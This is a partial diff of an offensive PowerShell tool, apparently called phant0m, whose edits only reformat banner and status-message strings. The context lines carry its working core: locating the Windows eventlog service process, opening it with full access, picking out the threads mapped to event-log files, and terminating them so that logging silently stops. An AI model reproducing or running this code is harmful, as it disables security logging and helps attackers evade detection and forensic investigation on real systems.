@@ -53,7 +53,7 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
         [Int]$Id = -1
     )
 
-    $intro = "
+    $intro = @'
 
         _                 _    ___
   _ __ | |__   __ _ _ __ | |_ / _ \ _ __ ___
@@ -62,11 +62,11 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
  | .__/|_| |_|\__,_|_| |_|\__|\___/|_| |_| |_|
  |_|
 
-"
+'@
 
     
     $resultado = $intro
-    $resultado += "`n[!] I'm here to blur the line between life and death..." 
+    $resultado += "`n[!] I'm here to blur the line between life and death...`n" 
     
 
     $ScriptBlock = {
@@ -1011,7 +1011,7 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
         }
 
 
-        $resultado += "[*] Enumerating threads of PID: $(Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)..." 
+        $resultado += "[*] Enumerating threads of PID: $(Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)... `n" 
         foreach ($Process in (Get-Process -Id (Get-WmiObject -Class win32_service -Filter "name = 'eventlog'" | select -exp ProcessId)))
             {
                 if (($ProcessHandle = $Kernel32::OpenProcess(0x1F0FFF, $false, $Process.Id)) -eq 0) {
@@ -1038,9 +1038,9 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
     else { $ReturnedObjects = Invoke-Command -ScriptBlock $ScriptBlock -ArgumentList @($Name, $Id) }
 
     $eventLogThreads = $ReturnedObjects | Where-Object {$_.MappedFile -like '*evt*'} | %{$_.ThreadId }
-    $resultado += "[*] Parsing Event Log Service Threads..." 
+    $resultado += "[*] Parsing Event Log Service Threads...`n" 
     if(!($eventLogThreads)) {
-      $resultado += "[!] There are no Event Log Service Threads, Event Log Service is not working!"
+      $resultado += "[!] There are no Event Log Service Threads, Event Log Service is not working!`n"
       $resultado += "[+] You are ready to go! `n"
       
     }
@@ -1049,12 +1049,12 @@ Author : Halil DALABASMAZ (https://github.com/hlldz, https://twitter.com/hlldz)
 
         for ($i = 0; $i -lt $array.Count; $i++) {
             $getThread = $Kernel32::OpenThread(0x0001, $false, $($array[$i]))
-            if ($kill = $Kernel32::TerminateThread($getThread, 1)) {$resultado += "[+] Thread $($array[$i]) Succesfully Killed!"}
+            if ($kill = $Kernel32::TerminateThread($getThread, 1)) {$resultado += "[+] Thread $($array[$i]) Succesfully Killed!`n"}
             $close = $Kernel32::CloseHandle($getThread)
         }
 
         
-        $resultado += "`n[+] All done, you are ready to go!" 
+        $resultado += "`n[+] All done, you are ready to go!`n" 
         
     }
 
